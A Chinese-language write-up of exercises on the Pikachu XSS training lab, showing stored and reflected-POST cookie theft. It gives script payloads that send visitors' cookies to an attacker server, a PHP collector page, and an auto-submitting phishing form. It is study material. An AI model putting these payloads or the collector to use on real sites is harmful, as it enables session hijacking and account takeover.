#### 存储型盗取cookie
- 准备工作：
	- 一台靶机，一台黑客服务器(这里使用两台虚拟机，靶机ip：192.168.245.176，黑客服务器ip：192.168.245.172)
- 攻击载荷：
```javascript
'"><script>
	document.location = 'http://192.168.245.172/pikachu/pkxss/xcookie/cookie.php?cookie=' + document.cookie;
</script>
```
	
- 攻击流程
	- 构造payload，将恶意代码提交到靶机中留言板（xss存储型），由于是存储型因此每当用户访问被攻击留言板都会执行`document.location = 'http://192.168.245.172/pikachu/pkxss/xcookie/cookie.php?cookie=`并向黑客服务器传递参数访问者cookie。攻击者可以在黑客服务器上获取访问者cookie。

**`http://192.168.245.172/pikachu/pkxss/xcookie/cookie.php此地址为cookie获取存储页面内容为`
```php
<?php
include_once '../inc/config.inc.php';
include_once '../inc/mysql.inc.php';
$link=connect();

//这个是获取cookie的api页面

if(isset($_GET['cookie'])){
    $time=date('Y-m-d g:i:s');
    $ipaddress=getenv ('REMOTE_ADDR');
    $cookie=$_GET['cookie'];
    $referer=$_SERVER['HTTP_REFERER'];
    $useragent=$_SERVER['HTTP_USER_AGENT'];
    $query="insert cookies(time,ipaddress,cookie,referer,useragent) 
    values('$time','$ipaddress','$cookie','$referer','$useragent')";
    $result=mysqli_query($link, $query);
}
header("Location:http://192.168.245.176/pikachu/index.php");//重定向到一个可信的网站

?>
```

#### 反射型(POST)盗取cookie
- 准备工作：
	- 一台靶机，一台黑客服务器(这里使用两台虚拟机，靶机ip：192.168.245.176，黑客服务器ip：192.168.245.172)
- 攻击载荷：
```javascript
<script>
	document.location = 'http://192.168.245.172/pikachu/pkxss/xcookie/cookie.php?cookie=' + document.cookie;
</script>
```

- 简单的钓鱼网页：
```html
<html>
<head>
<script>
window.onload = function() {
  document.getElementById("postsubmit").click();
}
</script>
</head>
<body>
<form method="post" action="http://192.168.245.176/pikachu/vul/xss/xsspost/xss_reflected_post.php">
    <input id="xssr_in" type="text" name="message" value=
    "<script>
document.location = 'http://192.168.245.172/pikachu/pkxss/xcookie/cookie.php?cookie=' + document.cookie;
	</script>"
	 />
    <input id="postsubmit" type="submit" name="submit" value="submit" />
</form>
</body>
</html>
```
- 攻击流程
	- 在黑客服务器中构造钓鱼网站，当用户访问钓鱼网站时直接执行JavaScript代码无需用户交互，每当目标访问钓鱼网站会执行`document.location = 'http://192.168.245.172/pikachu/pkxss/xcookie/cookie.php?cookie=`并向黑客服务器传递参数访问者cookie。攻击者可以在黑客服务器上获取访问者cookie。